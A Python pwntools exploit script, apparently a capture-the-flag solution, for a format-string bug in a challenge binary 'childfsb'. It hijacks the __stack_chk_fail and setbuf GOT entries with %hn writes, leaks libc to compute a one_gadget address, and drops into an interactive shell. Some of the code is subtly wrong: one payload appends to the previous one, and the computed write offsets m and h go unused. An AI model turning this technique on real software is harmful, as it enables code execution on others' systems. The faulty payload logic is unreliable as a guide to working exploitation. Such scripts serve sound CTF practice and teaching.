#!/usr/bin/python 
from pwn import *
from koharin import *

context.log_level = 'debug'
#p = remote("ctf.j0n9hyun.xyz", 3037)
p = process("./childfsb")
elf = ELF("./childfsb")
#libc = ELF("./libc.so.6")
libc = elf.libc
one_gadget_off = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
main = elf.symbols['main']
stack_chk_fail_got = elf.got['__stack_chk_fail']
setbuf_got = elf.got['setbuf']
setbuf_plt = elf.plt['setbuf']

pay = '%{}c'.format(main & 0xFFFF)
pay += '%8$hn' # 6 + (24 / 8)
pay += '%11$p'
pay += p64(stack_chk_fail_got)
pay += 'A'*(0x19-len(pay)) #for canary 

p.sendafter("hello\n", pay)

# libc leak
p.recvuntil("0x")
leak = int('0x' + p.recv(12), 16)
log.info("__libc_start_main+240 : "+hex(leak))
libcBase = leak - libc.sym['__libc_start_main'] - 240
log.info("libcBase : "+hex(libcBase))
one_gadget = libcBase + one_gadget_off[0]
log.info("one_gadget : "+hex(one_gadget))

low = one_gadget & 0xFFFF
middle = (one_gadget >> 16) & 0xFFFF
high = (one_gadget >> 32) & 0xFFFF
#log.info("one_gadget_low : "+hex(low))
#log.info("one_gadget_middle : "+hex(middle))

if middle > low: 
    m = middle - low
else: 
    m = 0x10000 + middle - low
if high > middle: 
    h = high - middle
else: 
    h = 0x10000 + high - middle

gdb.attach(p)

pay = '%{}c'.format(low)
pay += '%8$hn' # 6 + 16/8 = 8
pay += 'A'*(8 - len(pay)%8) #padding
#print len(pay)
pay += p64(setbuf_got)
pay += 'A'*(0x19-len(pay))

p.sendafter("hello\n", pay)

pay += '%{}c'.format(middle)
pay += '%9$hn'
pay += 'A'*(8 - len(pay)%8) #padding
pay += p64(setbuf_got+2)
pay += 'A'*(0x19-len(pay))

p.sendafter("hello\n", pay)

pay = '%{}c'.format(setbuf_plt & 0xFFFF)
pay += '%8$hn'
pay += 'A'*(8-len(pay)%8)
pay += p64(stack_chk_fail_got)
pay += 'A'*(0x19-len(pay))

p.sendafter("hello\n", pay)

p.interactive()

